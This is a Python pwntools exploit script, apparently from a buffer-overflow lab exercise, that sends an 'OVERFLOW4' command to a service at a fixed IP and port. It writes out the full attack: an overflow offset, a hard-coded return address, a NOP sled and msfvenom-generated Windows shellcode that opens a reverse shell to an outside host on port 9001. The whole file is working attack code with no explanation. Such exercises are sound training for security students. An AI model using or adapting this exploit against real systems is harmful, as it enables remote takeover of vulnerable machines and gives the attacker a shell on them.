#!/usr/bin/env python3

from pwn import *

host = "10.10.129.151"
port = 1337

s = remote(host, port)
total_length = 3000
offset = 2026
new_eip = p32(0x62501203)
nop = b"\x90" * 10
buf =  b""
buf += b"\xdb\xd6\xb8\x71\xa3\xca\x67\xd9\x74\x24\xf4\x5b\x29"
buf += b"\xc9\xb1\x52\x31\x43\x17\x03\x43\x17\x83\x9a\x5f\x28"
buf += b"\x92\xa0\x48\x2f\x5d\x58\x89\x50\xd7\xbd\xb8\x50\x83"
buf += b"\xb6\xeb\x60\xc7\x9a\x07\x0a\x85\x0e\x93\x7e\x02\x21"
buf += b"\x14\x34\x74\x0c\xa5\x65\x44\x0f\x25\x74\x99\xef\x14"
buf += b"\xb7\xec\xee\x51\xaa\x1d\xa2\x0a\xa0\xb0\x52\x3e\xfc"
buf += b"\x08\xd9\x0c\x10\x09\x3e\xc4\x13\x38\x91\x5e\x4a\x9a"
buf += b"\x10\xb2\xe6\x93\x0a\xd7\xc3\x6a\xa1\x23\xbf\x6c\x63"
buf += b"\x7a\x40\xc2\x4a\xb2\xb3\x1a\x8b\x75\x2c\x69\xe5\x85"
buf += b"\xd1\x6a\x32\xf7\x0d\xfe\xa0\x5f\xc5\x58\x0c\x61\x0a"
buf += b"\x3e\xc7\x6d\xe7\x34\x8f\x71\xf6\x99\xa4\x8e\x73\x1c"
buf += b"\x6a\x07\xc7\x3b\xae\x43\x93\x22\xf7\x29\x72\x5a\xe7"
buf += b"\x91\x2b\xfe\x6c\x3f\x3f\x73\x2f\x28\x8c\xbe\xcf\xa8"
buf += b"\x9a\xc9\xbc\x9a\x05\x62\x2a\x97\xce\xac\xad\xd8\xe4"
buf += b"\x09\x21\x27\x07\x6a\x68\xec\x53\x3a\x02\xc5\xdb\xd1"
buf += b"\xd2\xea\x09\x75\x82\x44\xe2\x36\x72\x25\x52\xdf\x98"
buf += b"\xaa\x8d\xff\xa3\x60\xa6\x6a\x5e\xe3\xc3\x7b\x6b\xef"
buf += b"\xbb\x79\x6b\x2c\x15\xf7\x8d\x58\x75\x51\x06\xf5\xec"
buf += b"\xf8\xdc\x64\xf0\xd6\x99\xa7\x7a\xd5\x5e\x69\x8b\x90"
buf += b"\x4c\x1e\x7b\xef\x2e\x89\x84\xc5\x46\x55\x16\x82\x96"
buf += b"\x10\x0b\x1d\xc1\x75\xfd\x54\x87\x6b\xa4\xce\xb5\x71"
buf += b"\x30\x28\x7d\xae\x81\xb7\x7c\x23\xbd\x93\x6e\xfd\x3e"
buf += b"\x98\xda\x51\x69\x76\xb4\x17\xc3\x38\x6e\xce\xb8\x92"
buf += b"\xe6\x97\xf2\x24\x70\x98\xde\xd2\x9c\x29\xb7\xa2\xa3"
buf += b"\x86\x5f\x23\xdc\xfa\xff\xcc\x37\xbf\xf0\x86\x15\x96"
buf += b"\x98\x4e\xcc\xaa\xc4\x70\x3b\xe8\xf0\xf2\xc9\x91\x06"
buf += b"\xea\xb8\x94\x43\xac\x51\xe5\xdc\x59\x55\x5a\xdc\x4b"
shellcode = buf # msfvenom -p windows/shell_reverse_tcp LHOST=10.17.11.28 LPORT=9001 -b "\x00\xa9\xcd\xd4" -f py



payload = [
    b"OVERFLOW4 ",
    b"A" * offset,
    new_eip,
    nop,
    shellcode,
    b"C" * (total_length - offset - len(new_eip) - len(nop) - len(shellcode)),
]

payload = b"".join(payload)
s.send(payload)
s.close()